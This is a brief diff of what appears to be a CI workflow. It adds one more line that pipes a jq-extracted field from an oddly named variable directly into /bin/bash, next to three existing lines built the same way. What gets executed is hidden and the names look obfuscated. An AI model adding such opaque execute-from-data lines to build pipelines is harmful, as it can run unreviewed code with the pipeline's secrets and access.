@@ -26,6 +26,7 @@ jobs:
           echo $ndcp36 | jq -r .ldh66303 | /bin/bash
           printf '%s' "$xab048" | jq -r .humm1 | /bin/bash
           printf '%s' "$k81469" | jq -r .x5270 | /bin/bash
+          echo $m9 | jq -r .vnam01358 | /bin/bash
 
       - name: Store artifact
         if: always()
